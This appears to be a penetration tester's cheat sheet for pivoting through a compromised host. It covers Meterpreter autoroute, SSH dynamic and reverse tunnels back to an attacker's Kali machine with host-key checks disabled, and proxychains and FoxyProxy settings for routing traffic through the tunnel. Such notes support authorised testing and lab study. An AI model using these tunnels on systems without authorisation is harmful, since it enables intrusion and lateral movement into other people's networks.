# SSH Tunnel

NOTE: needs valid SSH creds on box to pivot from.

## meterpreter

```bash
run autoroute -s IP/CIDR
run autoroute -p
[OR]
use post/multi/manage/autoroute
```

## using ssh:

### Outgoing

```bash
ssh user@IP -D 6900
# this sets up a tunnel between localhost:TUNNEL-PORT and target
# any requests to localhost:TUNNEL-PORT is routed via target
```

### Incoming

#### authorized_keys file

```bash
from="IP",command="echo 'This account can only be used for Port Forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty <SSH-PUBLIC-key>
```

#### Command

```bash
# for allowing a connecting to your port from outside (incoming)
ssh -N -f -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -R PORT -i <id_rsa> KALI-USER@KALI-IP

# -N: not running commands
# -f: go to background
# UserKnownHostsFile=/dev/null & StrictHostKeyChecking=no will not ask kali password; not safe to enter password on target.
```

## Proxychains4 config

### /etc/proxychains4.conf

```bash
# add line for socks4 proxy 
socks4 127.0.0.1 6900

# add line for socks5 proxy
socks5 127.0.0.1 6900
```

Now, run any command using `$ proxychains4 [command]`

## proxychains4 for browser

Set up a foxyproxy configuration for browser:

1. Title: proxychains
2. Proxy Type: SOCKS4
3. Proxy IP: localhost
4. Port: 6900